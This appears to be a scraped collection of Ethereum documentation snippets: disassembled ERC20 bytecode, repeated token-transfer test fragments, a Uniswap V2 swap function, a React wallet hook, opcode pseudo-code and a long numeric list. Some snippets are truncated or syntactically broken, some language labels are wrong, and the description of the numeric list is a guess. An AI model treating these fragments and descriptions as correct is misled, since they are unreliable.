SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP\n```\n\n----------------------------------------\n\nTITLE: Verifying Token Transfer Results\nDESCRIPTION: Code to verify that the token transfer was executed correctly by checking both the sender's and recipient's token balances after the transfer operation.\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Verifying Token Transfer Results\nDESCRIPTION: Code to verify that the token transfer was executed correctly by checking both the sender's and recipient's token balances after the transfer operation.\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Verifying Token Transfer Results\nDESCRIPTION: Code to verify that the token transfer was executed correctly by checking both the sender's and recipient's token balances after the transfer operation.\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Verifying Token Transfer Results\nDESCRIPTION: Code to verify that the token transfer was executed correctly by checking both the sender's and recipient's token balances after the transfer operation.\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Verifying Token Transfer Results\nDESCRIPTION: Code to verify that the token transfer was executed correctly by checking both the sender's and recipient's token balances after the transfer operation.\n\nLANGUAGE: javascript\nCODE:\n```\n    await (await signer.sendTransaction(transferTx)).wait()\n\n    // Check that we have 256 tokens less\n    expect (await token.balanceOf(signer.address)).to.equal(1000-256)\n\n    // And that our destination got them\n    expect (await token.balanceOf(destAddr)).to.equal(256)\n  })    // it\n})      // describe\n```\n\n----------------------------------------\n\nTITLE: Using Cache Keys in Foundry Tests\nDESCRIPTION: Demonstrates retrieving and using cache keys returned from cacheWrite function for testing purposes, noting this pattern isn't usable in production transactions.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testReadWriteCached() public {\n        uint cacheGoat = worm.cacheWrite(0x60A7);\n```\n\n----------------------------------------\n\nTITLE: Tracking Cumulative Prices in Uniswap Pair\nDESCRIPTION: Variables for tracking cumulative price data for each token relative to the other. These can be used to calculate time-weighted average prices across any time period.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public price0CumulativeLast;\nuint public price1CumulativeLast;\n```\n\n----------------------------------------\n\nTITLE: Testing Balance Changes with Waffle's changeBalances Matcher\nDESCRIPTION: Test that verifies if the split method correctly changes the balances of both receivers by the expected amounts.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Changes accounts balances\", async () => {\n  await expect(() => splitter.split({ value: 50 })).to.changeBalances(\n    [receiver1, receiver2],\n    [25, 25]\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: EVM Implementation of Allowance Checking\nDESCRIPTION: This snippet contains the EVM bytecode for checking token allowances between two addresses. It accesses the nested mapping structure to retrieve the approved amount.\n\nLANGUAGE: evm\nCODE:\n```\nPUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: STATICCALL Operation in EVM (FA)\nDESCRIPTION: Performs a read-only call that doesn't allow state modifications. Used for view/pure function calls, storing any return data in memory.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Função de teste para leitura de parâmetros\nDESCRIPTION: Função pública que lê quatro parâmetros do calldata e os retorna, facilitando o teste da funcionalidade de leitura de parâmetros do contrato.\n\nLANGUAGE: solidity\nCODE:\n```\n    // For testing _readParams, test reading four parameters\n    function fourParam() public\n        returns (uint256,uint256,uint256,uint256)\n    {\n        uint[] memory params;\n        params = _readParams(4);\n        return (params[0], params[1], params[2], params[3]);\n    }    // fourParam\n```\n\n----------------------------------------\n\nTITLE: Waffle Configuration File\nDESCRIPTION: JSON configuration for waffle.json that specifies compiler details, source directory, and output directory for compiled contracts.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"compilerType\": \"solcjs\",\n  \"compilerVersion\": \"0.6.2\",\n  \"sourceDirectory\": \"./contracts\",\n  \"outputDirectory\": \"./build\"\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Error Messages in EVM Bytecode\nDESCRIPTION: This segment contains the error messages used by the ERC20 implementation. It includes standard ERC20 error messages for scenarios like transfers to zero address, insufficient balance, and exceeded allowance, encoded in the contract bytecode.\n\nLANGUAGE: bytecode\nCODE:\n```\nINVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20747261 PUSH15 0x736665722066726F6D20746865207A PUSH6 0x726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH5 0x6563726561 PUSH20 0x656420616C6C6F77616E63652062656C6F77207A PUSH6 0x726FA2646970 PUSH7 0x735822122081C8 BLOCKHASH CREATE DUP8 0xCE 0xF9 0x2F 0xEC 0xCB SUB STATICCALL 0xDC PUSH8 0x8B2708C331896EC5 NUMBER 0x2B 0x5D 0x4C PUSH8 0x5F27B6D3E664736F PUSH13 0x63430006020033000000000000\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH to Tokens Swap with Fee Support in Uniswap V2\nDESCRIPTION: Function that swaps ETH for tokens supporting tokens with transfer fees. It wraps ETH to WETH, transfers it to the pair contract, and executes the swap while ensuring minimum output amount requirements are met.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n    {\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        uint amountIn = msg.value;\n        IWETH(WETH).deposit{value: amountIn}();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Using useEffect Hook to Initialize Wallet Connection in React Component\nDESCRIPTION: This useEffect hook initializes the wallet connection state when the component mounts. It loads the current message, sets up a smart contract listener, and checks for existing wallet connections to update the UI accordingly.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Using useEffect Hook to Initialize Wallet Connection in React Component\nDESCRIPTION: This useEffect hook initializes the wallet connection state when the component mounts. It loads the current message, sets up a smart contract listener, and checks for existing wallet connections to update the UI accordingly.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode Implementation in EVM\nDESCRIPTION: The RETURN opcode (0xF3) returns data from memory to the caller. It takes offset and length parameters to determine which section of memory to return.\n\nLANGUAGE: plaintext\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Testing Parameter Reading Functionality\nDESCRIPTION: Tests the readParam functionality by making low-level calls to the cache contract and verifying that parameters are correctly processed and returned.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testReadParam() public {\n        address _cacheAddr = address(cache);\n        bool _success;\n        bytes memory _callInput;\n        bytes memory _callOutput;\n\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            // First value, add it to the cache\n            cache.INTO_CACHE(),\n            bytes32(VAL_A),\n        );\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n        assertEq(cache.cacheRead(1), VAL_A);\n        assertEq(cache.cacheRead(2), VAL_C);\n        assertEq(toUint256(_callOutput,0), VAL_A);\n        assertEq(toUint256(_callOutput,32), VAL_B);\n        assertEq(toUint256(_callOutput,64), VAL_C);\n        assertEq(toUint256(_callOutput,96), VAL_C);\n\n        // Second call, we can use the cache\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value in the Cache\n            bytes1(0x01),\n            // Second value, don't add it to the cache\n            cache.DONT_CACHE(),\n            bytes32(VAL_B),\n\n            // Third and fourth values, same value\n            bytes1(0x02),\n            bytes1(0x02)\n        );\n    }   // testReadParam\n```\n\n----------------------------------------\n\nTITLE: Sequential Numerical Values for Ethereum Memory or Checkpoints\nDESCRIPTION: A comprehensive list of numerical values arranged in a comma-separated format, likely representing memory addresses, block heights, or checkpoint values used in Ethereum's implementation. These sequential values appear to increase steadily and may be used for memory management or blockchain state tracking.\n\nLANGUAGE: text\nCODE:\n```\n189791936, 189923264, 190054208, 190182848, 190315072, 190447424,\n190577984, 190709312, 190840768, 190971328, 191102656, 191233472,\n191364032, 191495872, 191626816, 191758016, 191888192, 192020288,\n192148928, 192282176, 192413504, 192542528, 192674752, 192805952,\n192937792, 193068608, 193198912, 193330496, 193462208, 193592384,\n193723456, 193854272, 193985984, 194116672, 194247232, 194379712,\n194508352, 194641856, 194772544, 194900672, 195035072, 195166016,\n195296704, 195428032, 195558592, 195690304, 195818176, 195952576,\n196083392, 196214336, 196345792, 196476736, 196607552, 196739008,\n196869952, 197000768, 197130688, 197262784, 197394368, 197523904,\n197656384, 197787584, 197916608, 198049472, 198180544, 198310208,\n198442432, 198573632, 198705088, 198834368, 198967232, 199097792,\n199228352, 199360192, 199491392, 199621696, 199751744, 199883968,\n200014016, 200146624, 200276672, 200408128, 200540096, 200671168,\n200801984, 200933312, 201062464, 201194944, 201326144, 201457472,\n201588544, 201719744, 201850816, 201981632, 202111552, 202244032,\n202374464, 202505152, 202636352, 202767808, 202898368, 203030336,\n203159872, 203292608, 203423296, 203553472, 203685824, 203816896,\n203947712, 204078272, 204208192, 204341056, 204472256, 204603328,\n204733888, 204864448, 204996544, 205125568, 205258304, 205388864,\n205517632, 205650112, 205782208, 205913536, 206044736, 206176192,\n206307008, 206434496, 206569024, 206700224, 206831168, 206961856,\n207093056, 207223616, 207355328, 207486784, 207616832, 207749056,\n207879104, 208010048, 208141888, 208273216, 208404032, 208534336,\n208666048, 208796864, 208927424, 209059264, 209189824, 209321792,\n209451584, 209582656, 209715136, 209845568, 209976896, 210106432,\n210239296, 210370112, 210501568, 210630976, 210763712, 210894272,\n211024832, 211156672, 211287616, 211418176, 211549376, 211679296,\n211812032, 211942592, 212074432, 212204864, 212334016, 212467648,\n212597824, 212727616, 212860352, 212991424, 213120832, 213253952,\n213385024, 213515584, 213645632, 213777728, 213909184, 214040128,\n214170688, 214302656, 214433728, 214564544, 214695232, 214826048,\n214956992, 215089088, 215219776, 215350592, 215482304, 215613248,\n215743552, 215874752, 216005312, 216137024, 216267328, 216399296,\n216530752, 216661696, 216790592, 216923968, 217054528, 217183168,\n217316672, 217448128, 217579072, 217709504, 217838912, 217972672,\n218102848, 218233024, 218364736, 218496832, 218627776, 218759104,\n218888896, 219021248, 219151936, 219281728, 219413056, 219545024,\n219675968, 219807296, 219938624, 220069312, 220200128, 220331456,\n220461632, 220592704, 220725184, 220855744, 220987072, 221117888,\n221249216, 221378368, 221510336, 221642048, 221772736, 221904832,\n222031808, 222166976, 222297536, 222428992, 222559936, 222690368,\n222820672, 222953152, 223083968, 223213376, 223345984, 223476928,\n223608512, 223738688, 223869376, 224001472, 224132672, 224262848,\n224394944, 224524864, 224657344, 224788288, 224919488, 225050432,\n225181504, 225312704, 225443776, 225574592, 225704768, 225834176,\n225966784, 226097216, 226229824, 226360384, 226491712, 226623424,\n226754368, 226885312, 227015104, 227147456, 227278528, 227409472,\n227539904, 227669696, 227802944, 227932352, 228065216, 228196288,\n228326464, 228457792, 228588736, 228720064, 228850112, 228981056,\n229113152, 229243328, 229375936, 229505344, 229636928, 229769152,\n229894976, 230030272, 230162368, 230292416, 230424512, 230553152,\n230684864, 230816704, 230948416, 231079616, 231210944, 231342016,\n231472448, 231603776, 231733952, 231866176, 231996736, 232127296,\n232259392, 232388672, 232521664, 232652608, 232782272, 232914496,\n233043904, 233175616, 233306816, 233438528, 233569984, 233699776,\n233830592, 233962688, 234092224, 234221888, 234353984, 234485312,\n234618304, 234749888, 234880832, 235011776, 235142464, 235274048,\n235403456, 235535936, 235667392, 235797568, 235928768, 236057152,\n236190272, 236322752, 236453312, 236583616, 236715712, 236846528,\n236976448, 237108544, 237239104, 237371072, 237501632, 237630784,\n237764416, 237895232, 238026688, 238157632, 238286912, 238419392,\n238548032, 238681024, 238812608, 238941632, 239075008, 239206336,\n239335232, 239466944, 239599168, 239730496, 239861312, 239992384,\n240122816, 240254656, 240385856, 240516928, 240647872, 240779072,\n240909632, 241040704, 241171904, 241302848, 241433408, 241565248,\n241696192, 241825984, 241958848, 242088256, 242220224, 242352064,\n242481856, 242611648, 242744896, 242876224, 243005632, 243138496,\n243268672, 243400384, 243531712, 243662656, 243793856, 243924544,\n244054592, 244187072, 244316608, 244448704, 244580032, 244710976,\n244841536, 244972864, 245104448, 245233984, 245365312, 245497792,\n245628736, 